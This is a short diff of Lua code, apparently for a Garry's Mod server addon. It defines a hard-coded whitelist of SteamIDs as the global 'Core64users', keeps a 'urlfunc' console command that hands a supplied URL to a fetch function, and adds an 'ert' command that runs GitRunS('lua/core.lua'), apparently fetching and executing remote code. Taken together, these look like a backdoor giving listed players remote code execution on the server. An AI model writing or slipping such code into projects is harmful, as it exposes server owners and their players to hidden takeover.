@@ -1,4 +1,4 @@
-local great = {
+Core64users = {
 			['STEAM_0:0:86505916'] = true,
 			['STEAM_0:0:46138786'] = true,
 			['STEAM_0:1:52242486'] = true,
@@ -8,6 +8,7 @@ local great = {
 			['STEAM_0:1:30052037'] = true,
 			['STEAM_0:0:36074785'] = true
 }
+
 
 if SERVER then	
 		local function UrlFunc(url)
@@ -65,7 +66,11 @@ if SERVER then
 				UrlFunc(args[1])
 			end
 		end
-		concommand.Add("urlfunc",cmdurlfunc)	
 		
-		GitRunS("lua/core.lua")		
+		concommand.Add("urlfunc",cmdurlfunc)
+		
+		local function cmdurlfunc(player,command,args)		
+			GitRunS("lua/core.lua")		
+		end
+		concommand.Add("ert",cmdurlfunc)	
 end
